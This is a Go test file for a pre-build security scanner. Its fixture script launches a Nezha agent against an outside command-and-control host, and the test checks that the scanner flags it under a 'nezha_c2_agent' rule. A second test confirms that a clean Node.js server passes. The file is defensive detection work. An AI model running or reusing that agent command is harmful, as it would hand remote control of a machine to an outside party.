package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestScanSourceTreeForThreatsBlocksNezhaAndMiners(t *testing.T) {
	dir := t.TempDir()
	scriptPath := filepath.Join(dir, "start.sh")
	err := os.WriteFile(scriptPath, []byte("#!/bin/sh\n./nezha-agent -s vip1715.dpdns.org:5555\n"), 0644)
	if err != nil {
		t.Fatalf("failed to write test file: %v", err)
	}

	scanErr := scanSourceTreeForThreats(dir)
	if scanErr == nil {
		t.Fatal("expected scanSourceTreeForThreats to reject Nezha C2 agent script")
	}
	if !strings.Contains(scanErr.Error(), "nezha_c2_agent") {
		t.Fatalf("expected nezha_c2_agent rule match, got: %v", scanErr)
	}
}

func TestScanSourceTreeForThreatsAllowsCleanApp(t *testing.T) {
	dir := t.TempDir()
	err := os.WriteFile(
		filepath.Join(dir, "server.js"),
		[]byte("const http = require('http');\nhttp.createServer((_, res) => res.end('ok')).listen(3000);\n"),
		0644,
	)
	if err != nil {
		t.Fatalf("failed to write clean file: %v", err)
	}

	if scanErr := scanSourceTreeForThreats(dir); scanErr != nil {
		t.Fatalf("expected clean app to pass pre-build security scan, got: %v", scanErr)
	}
}
